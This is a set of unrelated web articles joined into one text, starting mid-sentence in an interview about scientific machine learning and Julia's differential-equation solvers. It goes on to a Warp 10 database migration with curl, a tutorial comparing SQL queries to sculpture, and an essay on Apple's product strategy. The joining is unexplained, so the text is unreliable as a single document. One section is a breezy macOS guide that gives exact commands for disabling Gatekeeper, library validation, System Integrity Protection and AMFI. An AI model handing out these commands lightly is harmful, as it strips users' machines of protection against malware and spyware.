system. If you know this, great! Then you have a very predictive model. You might know all of the chemicals which interact but not know the reaction rates, and then 12 data points can turn this into quite a predictive model. So these models are interpretable (since it’s all about the mechanism), data efficient, etc. They are great at extrapolating too: the theory of gravity gives pretty good predictions for what happens on Earth as it does for the solar system as it does for galaxies.</p><p id="4d96">Data-driven modeling, like machine learning, takes a completely opposite approach of being “data first”. You have a non-mechanistic model, and you “train” the model based on the data. This requires a lot of data, but you can do this even when you have no idea what the mechanism is. What’s the mechanism for what movie someone will want to watch next on Netflix given the previous movies they’ve seen? Einstein didn’t have a theory for that! But with big data, you can generate such a model.</p><p id="66df">Scientific machine learning is about pairing together these two paradigms. Incorporating mechanism into machine learning makes it more interpretable, more data efficient, and better able to predict beyond the training data, all without requiring that you know all of the mechanisms. We’re using this in cases like pharmacometrics, where in the first clinical trial we may not know everything about how the drug works, but we can start with a pretty good guess by using mechanistic models derived for similar drugs, and use the incoming data to train models which transforms the prior model towards the data.</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/1836/1*ihyMT0ujkdDopf3M8eiXUw.png" width="918" height="746" srcset="https://miro.medium.com/max/552/1*ihyMT0ujkdDopf3M8eiXUw.png 276w, https://miro.medium.com/max/1104/1*ihyMT0ujkdDopf3M8eiXUw.png 552w, https://miro.medium.com/max/1280/1*ihyMT0ujkdDopf3M8eiXUw.png 640w, https://miro.medium.com/max/1400/1*ihyMT0ujkdDopf3M8eiXUw.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*ihyMT0ujkdDopf3M8eiXUw.png?q=20"></p></div></div></div></figure><h2 id="d94b">What are Neural ODEs? When is it appropiate to work with one? Do you fear that accuracy or interpretability is lost by introducing a Neural Network as part of the equation? Aren’t there other learning methodologies suited for such a thing?</h2><p id="0b2b">Neural Ordinary Differential Equations or Neural ODEs are ordinary differential equations defined by a neural network. Indeed the result is less interpretable than having a mechanistic physical model, but it allows for the model to be learned directly from data. The neural network makes it not just estimating parameters, but estimating functions. As a middle ground, we created the <a href="https://arxiv.org/abs/2001.04385" rel="noopener">universal differential equation</a> which is a partially mechanistic model where the neural networks fill in areas of the model which are unknown or have a lot of uncertainty. In this sense, there is more of a continuum between the data-driven and mechanistic models.</p><h2 id="29cd">Currently, there exist many differential equations solvers, why do you think this is the case? Is there a way to choose the best one for each situation?</h2><p id="1230">We created an automated algorithm chooser in order to mitigate this issue. If you do 'solve(prob)' (i.e. don’t specify a solver algorithm), it will choose one for you. Then you can give it hints to go down different branches. As time goes on I think we will keep refining that algorithm and pushing more people towards that.</p><h2 id="46c4">What are the key reasons the SciML Differential Equations solver is so fast? How does it differ from others? How influential was writing it in Julia?</h2><p id="1393">Every differential equation solver specializes on some aspect of the differential equation, giving them different performance aspects. For example, BDF integrators, “the standard” for stiff equations, use values from past steps. This can speed things up if the equation is not too stiff, but if it’s too stiff then you cannot use a high order (known as the Dahlquist barrier) and it slows down. So it’s problem dependent as to how well it can mitigate numerical issues, which means for some problems it’s fast and in others it breaks down. Then, if you have discontinuities which are frequent, like dosing in pharmacometrics simulations, this also requires order reduction and thus makes this particular method slower. DifferentialEquations.jl has about 300 methods when you consider all of the tableaus across not just ODEs but also SDEs, DAEs, and DDEs, and it’s this collection that allows it to be efficient.</p><h2 id="bd12">Regarding the importance of being able to quantify the uncertainty of the numerical resolution when solving differential equations, how does SciML address this problem?</h2><p id="dd62">DifferentialEquations.jl comes with a module DiffEqUncertainty.jl that gives sampling-based estimates of numerical uncertainty by causing jitter on the order of the error estimates calculated on each step. Normally these error estimates are only used for adapting dt, but this gives a way to get essentially a free estimate of what other possible paths look like. Andrew Stuart’s group at CalTech then has a full publication that describes that this method indeed matches the error distribution of the full solve. So if you run this a hundred times you’ll get a sense of what all of the possible trajectories could’ve been given the error tolerance that you allowed.</p><h2 id="0bec">What are MultiScaleArrays? In what ways do these data structures help us in simulating complex scientific models?</h2><p id="853b">The differential equation solvers, and actually all of the SciML ecosystem, work on abstract interfaces which allow for the concrete implementation of a type to be radically different from the standard implementation. MultiScaleArrays is a nice example of this where an entire multi-scale model is represented as both a graph structure and an array simultaneously. This lets the user write a model like “for every cell in the lung, do the chemical reactions of a lung cell” to define a model, but have the stiff high-performance ODE solver automatically know how to interact with this object. It’s not even an array: it’s an array of arrays of arrays etc., which acts like an array. In this form it’s very efficient to allows cells to divide and die, and the ODE solver will adapt the size of the solution vector automatically as this changes.</p><p id="a8a3">While this was made for the specific case of multi-scale biological modeling in mind, other users have since come up with other great examples. CuArrays are CUDA-accelerated arrays that live on the GPU that can be dropped in as a replacement to the standard array, or ComponentArrays.jl defines an array type similar to MultiScaleArrays which is backed by a real vector, so it’s faster for standard computations but slower for size changes. A lot of new features can thus be directly added and optimized in the ODE solver just by changing the input types!</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/2576/1*crRcFtHznAsYXDCb1uh4oQ.png" width="1288" height="878" srcset="https://miro.medium.com/max/552/1*crRcFtHznAsYXDCb1uh4oQ.png 276w, https://miro.medium.com/max/1104/1*crRcFtHznAsYXDCb1uh4oQ.png 552w, https://miro.medium.com/max/1280/1*crRcFtHznAsYXDCb1uh4oQ.png 640w, https://miro.medium.com/max/1400/1*crRcFtHznAsYXDCb1uh4oQ.png 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/1*crRcFtHznAsYXDCb1uh4oQ.png?q=20"></p></div></div></div></figure><h2 id="0473">Are the processes of solving differential equations and training a Neural Networks similar? How do you put together both frameworks?</h2><p id="e4ec">Training a neural network is solving an ODE defined by the gradient of the loss function until zero. Solving that ODE with Euler’s method is gradient descent. So you could use an ODE solver as the algorithm for training a neural ODE, and there is a use case that we’re looking into for that. Differential equations are more ubiquitous than I think most people realize.</p><h2 id="a904">Is GPU computing integrated in the SciML ecosystem? How important is having this feature to a scientific computing framework nowadays?</h2><p id="48c3">Yes, there’s two major ways. …</p></div></div></section></div>

First, ask yourself, would you like to undo a decade of security protections painstakingly created by Apple, protecting your Mac from malware, spyware, and ransomware? What if these so-called <em>protections</em> prevented the normal and speedy usage of your Mac? See exhibits: [<a href="https://news.ycombinator.com/item?id=25074959">A,</a> <a href="https://news.ycombinator.com/item?id=23273247">B,</a> <a href="https://github.com/microsoft/vscode/issues/105446#issuecomment-722264044">C,</a> <a href="https://github.com/johnboiles/obs-mac-virtualcam/wiki/Compatibility#sip-workaround">D,</a> <a href="https://github.com/MacEnhance/MacForge">E,</a> <a href="https://lapcatsoftware.com/articles/unsigned.html">F</a>]</p>
<p>Is that a yes? <strong>Speed and convenience over security any day!</strong> Let us march on boldly 😃! The steps listed below will give you a short description of each protection we disable, and the necessary command in Terminal.</p>
<h4 id="stepbystepguide">Step-by-step Guide</h4>
<p><strong>Step 1: Disable GateKeeper.</strong> This is the part of macOS that deals with code signature validation. It checks if the app in question was signed by the creator, and then checks whether Apple has given the creator a thumbs-up. macOS 10.15 made this much more stringent, requiring Apple to give <em>each app</em> a thumbs-up.</p>
<pre><code>sudo spctl --master-disable
</code></pre>
<p><strong>Step 2: Disable Library Validation.</strong> This protection checks if an app's libraries are signed by Apple or the creator. Until very recently, macOS apps could load code freely from foreign sources called <em>code libraries</em>. With macOS 10.15, apps are no longer allowed to load libraries that weren't originally packaged with it, unless they explicitly allow it.</p>
<pre><code>sudo defaults write /Library/Preferences/com.apple.security.libraryvalidation.plist DisableLibraryValidation -bool true
</code></pre>
<p><strong>Step 3: Disable System Integrity Protection.</strong> <em>You have to enter Recovery Mode (by holding Command+R while rebooting) in order to disable SIP. This mode lets us change boot data for the Mac.</em> SIP prevents both malware and power-users alike from modifying the system files, core apps, and the kernel of macOS. It does this by only allowing apps and extensions signed by Apple to modify the system.</p>
<pre><code># From the Recovery Mode menubar: Utilities --&gt; Terminal
csrutil disable
</code></pre>
<p><strong>Step 4: Disable Apple Mobile File Integrity.</strong> AMFI is the macOS kernel module that enforces the code-signing validation from Step 1 and the library validation from Step 2. However, even after disabling the services above, AMFI is still checking the signatures of every app that is run, and will cause non-Apple apps to crash when they touch extra-sensitive areas of the system.</p>
<pre><code># While still in Recovery Mode
nvram boot-args="amfi_get_out_of_my_way=1"
</code></pre>
<p><strong>Step 5: Reboot &amp; Enjoy Liberty.</strong> No explanation required.</p>
<h4 id="caveats">Caveats:</h4>
<ul>
<li>If GateKeeper is enabled while AMFI is disabled, some apps will hang while opening.</li>
<li>If AMFI is disabled, prompts to allow apps access to the camera, microphone, accessibility etc. will not be shown. The <code>tccplus</code> utility, found <a href="https://github.com/jslegendre/tccplus">here</a>, alleviates this (there is a GUI script in the repo).</li>

November 13, 2020 | https://blog.senx.io/warp-10-migration/ | <a href="https://web.archive.org/web/*/https://blog.senx.io/warp-10-migration/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Migration of 38TB of data from a Warp 10 server to another. How can you do this? Is it more complex than migration of a 38TB SQL database?</p><article>
      
<p>The migration of a database from a server to a new one can be painful. </p>



<p>Recently, this article describing <a href="https://www.tarynpivots.com/post/migrating-40tb-sql-server-database/" target="_blank" rel="noreferrer noopener">how to migrate a 40TB SQL database</a> to another SQL database caught my attention. </p>



<p>It took the author huge efforts to migrate what looks like time series (HAProxy traffic logs). Using <a href="https://warp10.io/" target="_blank" rel="noreferrer noopener">Warp 10</a> in the same situation, migration would have been a lot simpler.</p>



<div><figure><img loading="lazy" src="https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate.jpg" alt="infographic about the migration from a Warp 10 database to another one" width="553" height="232" srcset="https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate.jpg 722w, https://blog.senx.io/wp-content/uploads/2020/11/schema_migrate-300x126.jpg 300w" sizes="(max-width: 553px) 100vw, 553px"></figure></div>



<h2>The plot</h2>



<p>For years, you are storing data on a Warp 10 standalone version. You reached the limit of the disk space, there is just a few TB remaining on 40TB. You do not want to delete anything. For this application, you just have one token.</p>



<pre>host: oldserver
Warp 10 port: 8080
read token: OldReadToken</pre>



<p>You bought 10 new servers, and you decided to jump to Warp 10 distributed version. Everything is ready for production.</p>



<pre>ingress host: newserver
Warp 10 port: 8080
write token: NewWriteToken</pre>



<h2>The migration</h2>



<p><strong>1/</strong> Redirect your traffic log output to the new server. </p>



<p><strong>2/</strong> If there are not on the same network, set a tunnel between the old server and the new one. The most bandwidth the better.</p>



<p><strong>3/</strong> Launch curl:</p>



<pre><code>curl  -H 'X-Warp10-Token: OldReadToken' "http://oldserver:8080/api/v0/fetch?start=1970-01-01T00%3A00%3A00.000Z&amp;stop=2020-11-16T00%3A00%3A00.000Z&amp;selector=~.*%7B%7D&amp;format=text&amp;dedup=false" | curl -T - -H 'Transfer-Encoding: chunked' -H 'X-Warp10-Token: NewWriteToken' 'http://newserver:8080/api/v0/update'</code></pre>



<p>Basically, read all from 1970 to now, and push it to the new server. </p>



<blockquote><p>You do not need any extra disk space. You do not need a lot of RAM either, thanks to chunking. </p></blockquote>



<p><strong>4/</strong> Wait...</p>



<p>During my tests between two old computers on my local network, with 7GB in LevelDB directory, it took 50 minutes to output 36GB, at a 12MB/s speed. WiFi was not the limit.</p>



<pre>% Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 36.3G    0 36.3G    0     0  12.2M      0 --:--:--  0:50:33 --:--:-- 11.2M</pre>







<p>On a gigabit network, the limit may be your old server output. Depending on your hardware, you will surely reach 50MB/s. </p>



<p>Let's extrapolate:</p>



<figure><table><tbody><tr><td></td><td>Small test</td><td>Serious one</td></tr><tr><td>LevelDB size</td><td>7GB</td><td>38TB</td></tr><tr><td>Datapoints</td><td>575M</td><td>~3.1 T</td></tr><tr><td>Text size</td><td>36GB</td><td>~194TB</td></tr><tr><td>Curl speed</td><td>12.2MB/s</td><td>~50MB/s</td></tr><tr><td>Time</td><td>50 minutes</td><td>~45 days</td></tr><tr><td></td><td></td><td></td></tr></tbody></table></figure>



<p>In my test dataset, there is a lot of <strong><a href="https://blog.senx.io/working-with-geo-data-in-warp-10/" target="_blank" rel="noreferrer noopener">geo time series</a></strong>, with location and elevation. <strong>Your data may be denser, and it will take less than 45 days with just a curl command</strong>. You may cut time in half and use two threads to do the migration. With spinning disks, more thread will increase seeking time anyway. </p>



<p>Now, read <a href="https://www.tarynpivots.com/post/migrating-40tb-sql-server-database/" target="_blank" rel="noreferrer noopener">the article</a> that retains my attention... 40 TB SQL database to move: <strong>11-month project. Tons of specific scripts. Lots of development hours.</strong> 8437 words in the blog article. 40 min estimated time to read the article!</p>



<h2>Q/A</h2>



<p><em><strong>Q:</strong> I have several tokens on my database!</em></p>



<p><strong>A:</strong> Assuming you also recreated tokens on your new server, iterate on them in a curl. If your new server shares the same secrets, the tokens will be the same, and migration will be easier. If you are <a href="https://blog.senx.io/all-there-is-to-know-about-warp-10-tokens/" target="_blank" rel="noreferrer noopener">familiar with tokens</a>, you can create some super read/write tokens too.</p>







<p><em><strong>Q:</strong> I want to migrate Warp 10 standalone to another Warp 10 standalone, not to a distributed one!</em></p>



<p><strong>A</strong>: Copy all Warp 10 files from the old server to the new one using Rsync. Then stop the old server. run rsync again (it should take just a few minutes). Start Warp 10 on the new server. Enjoy. </p>







<p><em><strong>Q:</strong> I don't want any service interruption!</em></p>



<p><strong>A:</strong> <a href="https://senx.io/contact" target="_blank" rel="noreferrer noopener">Contact us</a>. There are some solutions.</p>







<p><em><strong>Q:</strong> Bandwith is an issue for me. Can't we compress text?</em></p>



<p><strong>A:</strong> Sure you can! Pipe output to gzip before piping to the second curl, and add the correct content-type header to the second curl: <code>-H 'Content-Type: application/gzip'</code>. </p>







<h2>Conclusion</h2>



<p>I feel your disappointment. Just a little 600 words article. There is not even a complex WarpScript or a huge shell script to explain. I am sorry. The migration of Warp 10 to Warp 10 is just too simple.</p>

<![CDATA[SQL as Sculpture – An Intuitive Way to Understand Queries]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>


<p>
If you look at it from the right perspective - from way up high - you can say that sculpting, the activity of creating a sculpture, is about just two things:
</p>


<ol>
<li>Assembling a mass of material (aka your medium)</li>
<li>Carving that material down</li>
</ol>


<p>
Okay.  Maybe that's a little too high, a little too abstract.  
How about if we zoom in <em>just a bit</em> closer...  
</p>



<p>
A sculpture is often made of clay.  
Depending on how large you intend your sculpture to be, you might be able to find a single clay block big enough to suit your need.  
But if you can't - if you need a block that's larger than that - then you need to do two things:
</p>

<ol>
<li>acquire multiple blocks</li>
<li>mush all of those blocks together as a single (larger) block</li>
</ol>


<p>
After you have assembled your block(s), you will use a variety of tools to carve, or whittle the block down.  
You start with coarser tools that carve off big chunks.  
You work your way toward more delicate tools that make barely perceptible refinements.  
Eventually, a sense of perfection overtakes you and you jubilantly bellow:  
</p>

<h3><em>Finis!</em></h3>



<p>
This carving - painstaking craftsmanship - is sometimes described as finding (or even freeing) the fully formed sculpture that is hidden within (that inherently exists in) the material.  
On the one hand, that's an <em>amazing</em> way to think about carving a sculpture.  
On the other hand, it depresses me - because I lack such insight, myself.  
</p>

<p>
Or... maybe I don't.  Maybe I only lack it in an artistic context.  
</p>

<p>
What might it look like if we considered writing a SQL statement - a query, a SELECT statement - as an act of sculpting, of creating a sculpture?
</p>


<br>
<hr>
<br>
<h2>Assembling Your Data</h2>




<p>
The first thing you need to do in making... um... a... data sculpture... is to assemble your material.  
</p>

<p>
In SQL, your medium is sets of data.  
Note that I <em>did not</em> say that your medium is data.  I said that it is <em>sets</em> of data.  
That is an <em>essential</em> distinction that is lost on a lot of would be relational database users.  
</p>

<p>
A database is a set of tables.  
A table is a set of rows.  
A row is a set of fields (column values).  
A query (a SELECT statement) returns a result set.  That result set is structurally equivalent to a table - it is a set of zero or more rows, each of which is a set of one or more fields.
</p>

<p>
We can think of a table (a set of rows) as a block of data, sort of like a block of clay.  
In doing so, we're getting more abstract again.  But this time it helps us to build our intuition.
</p>



<p>
If you think of tables as blocks of data, then you can think of every SELECT statement as starting with an initial or primary block of data.  
Your primary block of data is the table that you name in the FROM clause.  
For example, here we retrieve all of the fields, in all of the rows, from a primary block of data (a table) named flashcards.  
</p>

<br>
<pre><code>SELECT * FROM flashcards;</code>
</pre>


<p>
Sometimes we need more than one block of data.  
This will be the case when our primary table does not have all of the data that we need - we need some of the rows, or some of the columns, from some other table(s).  
This poses two challenges:  
</p>

<ul>
<li>arranging the blocks (tables) sensibly</li>
<li>mushing the blocks (tables) together</li>
</ul>

<p>
But before we can do these things, we need to think about what the blocks might look like.
</p>

<p>
When we work with clay, we can expect that the blocks we mush together will all be of the same size and shape.  
If they're not, it really doesn't matter - because it's just clay.  
One blob of clay is (mostly) indistinguishable from any other.
</p>

<p>
When we work with data, though, we usually don't have that expectation.  
Most of the time, the other blocks (tables) we need are a different shape than our primary block.  
By the shape of a table, we mean the set of columns that define the table.  
If two tables are defined with the same set of columns, we can say that the tables are of the same shape.  
If they differ in any way, column-wise, we say that the tables are differently shaped.  
</p>


<br>
<h3>Arranging and Mushing Data Blocks of the Same Shape</h3>

<p>
When you have data blocks (tables) of the same shape, you can (you <em>must</em>) stack them on top of each other.  
You can do this because the columns align - each data block (table) has the same columns, in the same order, as all of the others.  
Each column in a data block can thus support its corresponding column in any data block(s) stacked above it.
</p>


<p>
Recall, as I said before, though, that a result set is equivalent to a table.  
That doesn't just mean that a result set <em>looks</em> like a table.  
It also means that we can <em>treat</em> a result set like a table.  
This is a <em>crucial</em> characteristic of result sets, because I wasn't quite precise in the last paragraph.  
You cannot actually stack <em>tables</em> on top of each other in a query.  
But you can stack <em>result sets</em>.  
And that gets us to the same place.  
</p>


<p>
We thus arrange and mush (stack) identically shaped data blocks (result sets) in what we call a union operation.  
We do this simply by inserting the UNION keyword in between two queries.  
</p>

<p>
For example, here we will stack a result set from querying a QA/staging table (flashcards_qa) below a result set from querying our primary (flashcards) table.  
</p>

<br>
<pre><code>SELECT * FROM flashcards
UNION 
SELECT * FROM flashcards_qa;</code>
</pre>


<p>
The UNION operator is used to stack two result sets, one on top of the other.  
It gathers together the rows returned by one query with those returned by another query, merging them all together into a single, larger result set.  
</p>

<p>
We can (we <em>should</em>) think of a UNION operation as adding more rows (but not more columns) to our primary block of data.  It makes the primary block taller (but not wider).
</p>

<p>
There's not much else to arranging and mushing together data blocks of the same shape.  
But you don't have to stop at two blocks.  
You can stack as many queries as you want, as long as the result set from each query is of the same shape - the same set of fields - as all of the others.
</p>



<br>
<h3>Arranging and Mushing Data Blocks of Different Shapes</h3>

<p>
When you have data blocks (tables) of different shapes, you cannot stack them on top of each other.
You cannot do so because their columns can't align.  
As such, your only option for arranging them is to lay them next to each other, side-by-side.
</p>

<p>
But we need to make one thing clear before we get to the how.  
Although these tables each have a different set of columns, they do have to have <em>at least one</em> column that is common between them - a column of the same semantic type (and the same data type).  
This is often an identifier field, such as a user_id number, or a purchase_id number.  But it could be anything - a date field, or even a text field.  
If the two tables do not have any common column(s) at all (one or more, of the same semantic type), <em>they cannot be mushed together</em>, under any circumstances.
</p>

<p>
Assuming we're good on that front, we arrange and mush differently shaped tables in what we call a table join operation.  
We append the JOIN keyword to our query's FROM clause, along with the name of the table we want to add columns from.  
Then we use the ON keyword to tell the DBMS how the tables are related.  
</p>

<p>
For example, here we will join the columns from a table named scores to those of our flashcards table.  
Both tables have a card_id field.
</p>

<br>
<pre><code>SELECT *
FROM flashcards
    JOIN scores
        ON flashcards.card_id = scores.card_id;</code>
</pre>


<p>
We can (we <em>should</em>) think of a table join operation as adding more columns to our primary block of data.  It makes our primary data block wider (but not taller).  
</p>

<p>
We're glossing over <em>a lot of detail</em> here.  
But the intuition is simple - laying one or more additional tables alongside your primary table.
</p>

<br>
<hr>
<br>
<h2>Carving Your Data</h2>


<p>
When it comes to carving your data block down to the size and shape you need, it should come as no surprise that you have two categories of choices.  
You can carve down the height of the block - the quantity of rows in the result set.  
Or you can carve down the width of the block - the quantity of fields (column values) in the result set.  
In most cases, you will do both.  
</p>

<p>
A reminder, though, that with the simplest query, we do neither.  
When we select * (an asterisk in the column list), we get all of the fields in the returned rows.  
When our query only includes the SELECT and FROM clauses, we get all of the rows returned from our table(s).  
So this query will retrieve all of the fields, in all of the rows, from our flashcards table:  
</p>

<br>
<pre><code>SELECT *
FROM flashcards;</code>
</pre>


<p>
To carve down the width of our data block - the quantity of fields in the result set - we simply name the columns we want - and only those columns - in the SELECT clause's column list:  
</p>

<br>
<pre><code>SELECT question FROM flashcards;
SELECT question, answer FROM flashcards;</code>
</pre>


<p>
When it comes to carving down the height of our data block - the quantity of rows in the result set - we have more than one tool at our disposal.  
</p>

<p>
The most important, and commonly used of these, is the WHERE clause.  
You can think of the WHERE clause as the multi-tool (e.g. Swiss Army knife) of carving instruments.  
You can use it to lop off huge chunks, or chip off little bits, from your block of data.  
</p>

<br>
<pre><code>SELECT * FROM flashcards WHERE author = 'Mike';
SELECT * FROM flashcards WHERE create_date &gt; '2020-09-01';
SELECT * FROM flashcards WHERE question like '%awesome%';</code>
</pre>


<p>
You can use it to make multiple cuts, all at the same time.  
</p>

<br>
<pre><code>SELECT * FROM flashcards
WHERE author = 'Mike'
    AND create_date &gt; '2020-09-01'
    AND question like '%awesome%';</code>
</pre>


<p>
The LIMIT clause is another commonly used row carving tool.  
It's not a very sophisticated tool, at least by itself.  
You can think of it as the kiddie scissors of carving tools.  
Here, we will retrieve only the first 25 rows from our flashcards table:  
</p>

<br>
<pre><code>SELECT * FROM flashcards
LIMIT 25;</code>
</pre>


<p>
The LIMIT clause is often used in combination with the OFFSET clause in order to take a slice from somewhere in the middle.  </p></div></div></div>

                <p>If you are a tech enthusiast, Apple has been very hard to miss. As a nerd, I look at Apple from a gadget perspective. But as a founder I look at them differently. Here are 6 lessons Apple can teach you about product development and marketing including one lesson you should not copy.</p>
<h2>1. Good architecture wins</h2>
<p>At its core, a MacBook as well as any other Apple computer, runs macOS. MacOS is based on the operating system Unix and a core called Darwin. Apple has made a very strong software architecture based on these components. That architecture is so strong that Apple is now able to switch out the very brain of the computer; both the processor/CPU and the language it speaks. The reason is that Apple has been making its own CPU for years for the iPhone. That CPU is so mature now that they feel a derivative of it will be better for the Macbooks as well. It also makes them independent of Intel. That is a big plus. Computer updates are usually directly linked to CPU updates and Apple is now completely free to run their own update cycles.</p>
<p>Apple once started with their own PowerPC CPU but 15 years ago they moved to Intel CPU’s because at that time, Intel was faster. Now, at the end of 2020, they introduced Apple Silicon, which will replace Intel because Intel can’t keep up anymore.</p>
<p>Swapping out a brain and the language it uses is a massive accomplishment. Apple did this twice; first from PowerPC to Intel and now from Intel to the Apple Silicon M1! The only reason they were able to do it was because of the good architecture their computers are built on.</p>
<p>Good architecture wins.</p>
<h2>2. Let your products share and borrow from each other</h2>
<p>The Darwin core we just talked about? It’s not just the core for MacOS. It’s also the core for iOS (iPhones), WatchOS (Apple Watches), tvOS (for Apple TV), and iPadOS (for the iPad).</p>
<p>The foundation of everything Apple builds is shared between these products. And it goes even further. A derivative of the brain used in an iPhone is now also used in that new MacBook Apple just announced. This means the chips Apple develops are built on a similar platform as well.</p>
<p>With the same hardware and the same software, you can also use the same code. That’s why it is so easy to develop for the iOS family of devices; there are so many similarities. That’s also the reason iPad/iPhone apps will work on your new MacBook, making apps device-agnostic.</p>
<p>This is a major plus for any developer, both internally and externally, writing programs or building hardware for the Apple family. If you share hardware and software in multiple products, you can move way faster.</p>
<h2>3. Be incomparable</h2>
<p>The announcement event unveiling the new Apple processors was a bit of a bummer for the hardcore nerd. Where chipmaker AMD will compare itself to Intel – which gives you a reference on how good they are – Apple does nothing like that.</p>
<p>Apple uses phrases like “Up to twice as fast as the latest notebook chips” or “Faster than 98% of PCs on the market” or “World’s fastest CPU performance per watt.”</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1024x576.png" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1024x576.png 1024w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-300x169.png 300w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-768x432.png 768w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-1536x864.png 1536w, https://wearespindle.com/wp-content/uploads/2020/11/m1-CPU-performance-per-watt-2048x1152.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>The nerd in me would like to know which latest laptop PC chip they are comparing the M1 to</em></p>

<p>If you are not clear about how you are measuring something, it’s an empty statement. But it’s only empty for me as a nerd. It’s not empty for their target audience and their market! Apple understands that their target consumer simply does not care about these detailed technical benchmarks.</p>
<p>The Apple customer hears: “Ha, you see, my brand is better than your Windows machine, I made the right choice”.</p>
<p>The Windows user hears: “Damn, Apple made something way faster than my Windows machine, I should be switching.”</p>
<p>The intro song <em>Tones and I – Fly Away</em> used for the “<a href="https://www.apple.com/apple-events/november-2020/">One More Thing</a>” event where the new MacBooks and processor were announced, even starts with the lyrics “I don’t want to be like them”.</p>
<p>It’s not about specs for Apple, it’s about bringing a sense of awe to their target audience, which makes them incomparable.</p>
<h2>4. Market everything by giving it a name</h2>
<p>The incomparable part is pure marketing, and it’s where Apple shines. They simply brand everything.</p>
<p>An Apple watch does not have a button; it has a <em>Digital Crown</em>.</p>
<p>Apple does not make processors, it makes <em>Apple Silicon</em>.</p>
<p>The new chip does not have a core for machine learning, it has a <em>Neural Engine</em>.</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1024x683.jpg" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1024x683.jpg 1024w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-300x200.jpg 300w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-768x512.jpg 768w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-1536x1024.jpg 1536w, https://wearespindle.com/wp-content/uploads/2020/11/apple-watch-digital-crown-2048x1365.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>An Apple watch does not have a button, it has a digital crown</em></p>

<p>It all feels special. It all feels unique. And it makes you feel like you need the product or the upgrade.</p>
<p>So, if you build a cool new product feature, put some effort in your feature branding as well. And, as we can learn from Apple, this starts with a cool name for each feature.</p>
<h2>5. Optimize for total chain control</h2>
<p>Apple can claim the new processor is x-times as fast because they don’t just control the hardware, they control the software as well. And that software is completely optimized for the hardware. The fact that 3rd party software still needs to be optimized for the hardware gives Apple an edge over 3rd parties as well. If Safari is faster and uses less battery than Chrome there is an extra reason to use Safari. If Final Cut Pro runs better than Adobe Premiere a user will choose Final Cut Pro.</p>
<p>This goes even further in the Apple Store used on iPhone and iPad devices. Apple does not just control the store. They control the hardware, the software, the store, and the software distribution channels. They even control their proprietary connector and the <a href="https://en.wikipedia.org/wiki/MFi_Program">devices that are allowed to use it</a>. They also control the <a href="https://www.ifixit.com/News/43008/apple-emails-reveal-internal-debate-on-right-to-repair">repair channels</a>.</p>
<p>You could even say they <a href="https://www.timetoplayfair.com/">abuse</a> <a href="https://www.theverge.com/2020/8/13/21366259/epic-fortnite-vbucks-mega-drop-discount-iphone-android">this</a> <a href="https://www.theguardian.com/environment/2017/mar/06/nebraska-farmers-right-to-repair-john-deere-apple">power</a>.</p>
<p>However you look at it, it makes Apple mighty successful and independent.</p>
<h2>6. Don’t be afraid to make radical decisions (that hurt customers)</h2>
<p>This one is the toughest to swallow. Switching processors is a radical decision which benefits the customers in the long run. These decisions are brave and should be celebrated.</p>
<p>On the other hand, Apple often makes decisions that directly affect customers in a negative way.</p>
<p>The new M1 chips have everything – even memory – built into the chip. That makes the chip very fast and efficient, but you won’t be able to upgrade memory anymore.</p>
<p>Apple can bring out new devices with just two small USB-C ports (their new laptops). Which means you have to buy dongles (Apple multiport $69,-). Apple can ditch the so-widely-used 3,5mm jack port on the iPhone. Which means you have to buy Apple headphones, preferably the expensive bluetooth ones (Apple AirPods Pro $249). Apple can keep a lightning port on the iPhone, whereas the entire smartphone world is going USB-C, which means you have to replace the cable and it creates a vendor lock for accessories. And yes, you have to buy those cables again and again because they are flimsy and break all the time (USB-C to Lightning Cable (1 m) $19).</p>

<p><img src="https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-1024x437.jpg" alt="" width="100%" srcset="https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-1024x437.jpg 1024w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-300x128.jpg 300w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable-768x327.jpg 768w, https://wearespindle.com/wp-content/uploads/2020/11/another-broken-apple-cable.jpg 1400w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p><em>The environment would really benefit from cables that don’t break within 6 months</em></p>

<p>They can even ditch a charger – where the new cables they supply with your phone are not even compatible with the existing iPhone chargers – so people have to buy a power brick (Apple 20w brick $19).</p>
<p>The reasoning here is very simple. No, it’s not innovation and it’s not the <a href="https://www.theverge.com/2020/10/16/21519466/apple-iphone-12-chargers-airpods-greenhouse-gas-emissions-e-waste">not the planet</a>. It is money. Apple is a shareholder-owned <a href="https://www.kevinrooke.com/post/apple-airpods-iphone-accessory-or-the-next-big-thing">money machine</a>. And this is the one thing I would ask you not to copy. Be there for your customers and the people you work with first, and let money be a by-product of doing the right stuff right.</p>
<h2>Changing the game for better or worse</h2>
